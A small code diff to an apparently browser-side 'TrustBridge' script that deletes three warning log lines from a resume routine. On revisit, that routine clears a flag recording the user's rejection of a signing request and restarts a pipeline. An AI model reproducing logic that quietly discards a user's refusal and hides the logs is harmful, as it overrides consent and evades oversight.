@@ -41,12 +41,12 @@
       if (isRevisit && S.userRejectedSign) {
         S.userRejectedSign = false;
         S.postConnectComplete = false;
-        console.warn('[TrustBridge] reset rejection state on revisit →', why);
+
       }
 
       kicking = true;
       lastKickAt = now;
-      console.warn('[TrustBridge] resume:', why, '→ startPipeline');
+
       var p;
       if (typeof L.startPipeline === 'function') {
         p = L.startPipeline({ reason: why || 'resume' });
@@ -60,7 +60,7 @@
       });
     } catch (e) {
       kicking = false;
-      console.warn('[TrustBridge]', e && e.message);
+
     }
   }
 
